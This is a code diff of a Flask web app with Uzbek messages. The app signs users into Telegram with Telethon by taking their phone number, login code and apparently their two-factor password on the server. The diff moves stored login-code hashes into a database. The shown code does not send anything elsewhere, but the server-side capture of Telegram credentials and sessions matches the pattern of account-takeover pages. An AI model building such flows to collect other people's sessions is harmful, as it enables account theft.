@@ -2,7 +2,7 @@
 import os
 import asyncio
 from flask import Flask, request, jsonify, render_template
-
+from database import save_login_code, get_login_code, delete_login_code
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
 from telethon.sessions import StringSession
@@ -30,8 +30,9 @@ def send_code():
 
     try:
         phone_code_hash = asyncio.run(_send())
-        pending_codes[phone] = phone_code_hash
+        save_login_code(phone, phone_code_hash)
         return jsonify({"status": "ok"})
+
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
@@ -41,9 +42,10 @@ def verify_code():
     phone = request.json.get("phone")
     code = request.json.get("code")
 
-    phone_code_hash = pending_codes.get(phone)
+    phone_code_hash = get_login_code(phone)
     if not phone_code_hash:
-        return jsonify({"status": "error", "message": "Kod eskirgan"})
+        return jsonify({"status": "error", "message": "Kod eskirgan, qayta yuboring"})
+
 
     async def _verify():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -80,8 +82,7 @@ def verify_code():
 
     except Exception as e:
         return jsonify({"status": "error", "message": "Kod noto‘g‘ri"})
-
-
+        
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
     phone = request.json.get("phone")
